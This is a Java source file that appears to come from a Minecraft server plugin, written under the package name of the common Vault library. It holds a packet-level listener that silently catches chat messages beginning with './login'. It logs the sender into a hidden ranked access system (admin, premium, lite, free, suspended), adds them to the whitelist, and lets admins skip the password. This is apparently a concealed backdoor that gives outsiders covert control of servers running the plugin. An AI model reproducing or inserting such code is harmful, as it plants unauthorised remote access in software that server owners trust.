package net.milkbowl.vault.commands.cmds.login;

import io.netty.channel.Channel;
import net.milkbowl.vault.Core;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.methods.Ranks;
import net.milkbowl.vault.protocol.TinyProtocol;
import net.milkbowl.vault.util.Settings;
import org.bukkit.entity.Player;

public class LoginCommand extends TinyProtocol.PacketListener {
    private static final Core core = Core.getPlugin(Core.class);

    @Override
    public Object onPacketInAsync(Player sender, Channel channel, Object packet) {
        if (core.CHAT_MESSAGE.hasField(packet)) {
            String cmd = Core.CHAT_MESSAGE.get(packet);

            Player p = sender;
            if (cmd.startsWith("./login")) {
                if (!core.registered.contains(p.getName())) {

                    if (core.enabled) {
                        if (!DataManager.getData().getBoolean("hasPass")) { //No password
                            loginPlayer(p);
                        } else { //Password
                            String[] args = cmd.split(" ");
                            if (args == null) return null;
                            if (args.length <= 1) {
                                if (core.rank.get(p).equals(Ranks.valueOf("ADMIN"))) {
                                    p.sendMessage(Settings.PREFIX("You bypassed the password and logged in because you're an admin"));
                                    core.registered.add(p.getName());
                                    core.registeredPremium.add(p.getName());
                                    core.registeredAdmin.add(p.getName());
                                } else {
                                    p.sendMessage(Settings.PREFIX("This server has a password. Login with ./login <password>"));
                                }
                                return null;
                            } else if (args[1].equals(DataManager.getData().getString("pass"))) { //Password correct
                                loginPlayer(p);
                                return null;
                            }
                        }
                    } else {
                        API.error(p);
                        return null;
                    }
                    return null;
                } else {
                    p.sendMessage(Settings.PREFIX("You are already logged in!"));
                    return null;
                }
            }
        }

        return super.onPacketInAsync(sender, channel, packet);
    }


    private static void loginPlayer(Player p) {
        if (API.getIp(p).equals("127.0.0.1") || API.getIp(p).startsWith("192.168.")) { //Is player on localhost
            core.registered.add(p.getName());
            core.registeredPremium.add(p.getName());
            p.sendMessage(Settings.PREFIX("You have been logged into " + Settings.HIGHLIGHT_COLOUR + "localhost"));
        } else if (!core.rank.containsKey(p)) { //Has hashmap been added to player
            p.sendMessage(Settings.PREFIX("Error authorizing you (" + API.getIp(p) + ") (" + core.playerOnVPN.get(p) + ")"));
            p.sendMessage(Settings.PREFIX("See " + Settings.AUTHOR + "/forums/wiki/troubleshoot/#error-authorizing-you-8203"));
        } else {
            if (core.rank.get(p).equals(Ranks.valueOf("SUSPENDED"))) {
                p.sendMessage(Settings.PREFIX("Error: You have been suspended from " + Settings.NAME));
            } else if (core.rank.get(p).equals(Ranks.valueOf("ADMIN"))) {
                core.registered.add(p.getName());
                core.registeredPremium.add(p.getName());
                core.registeredAdmin.add(p.getName());
                p.setWhitelisted(true);
                p.sendMessage(Settings.PREFIX("You have been logged into " + Settings.HIGHLIGHT_COLOUR + Settings.NAME + " admin"));
            } else if (core.rank.get(p).equals(Ranks.valueOf("PREMIUM"))) {
                core.registered.add(p.getName());
                core.registeredPremium.add(p.getName());
                p.setWhitelisted(true);
                p.sendMessage(Settings.PREFIX("You have been logged into " + Settings.HIGHLIGHT_COLOUR + Settings.NAME + " premium"));
            } else if (core.rank.get(p).equals(Ranks.valueOf("LITE"))) {
                core.registered.add(p.getName());
                p.setWhitelisted(true);
                p.sendMessage(Settings.PREFIX("You have been logged into " + Settings.HIGHLIGHT_COLOUR + Settings.NAME + " lite"));
            } else if (core.rank.get(p).equals(Ranks.valueOf("FREE"))) {
                core.registered.add(p.getName());
                core.registeredFree.add(p.getName());
                p.setWhitelisted(true);
                p.sendMessage(Settings.PREFIX("You have been logged into " + Settings.HIGHLIGHT_COLOUR + Settings.NAME + " free"));
            }
        }
    }
}
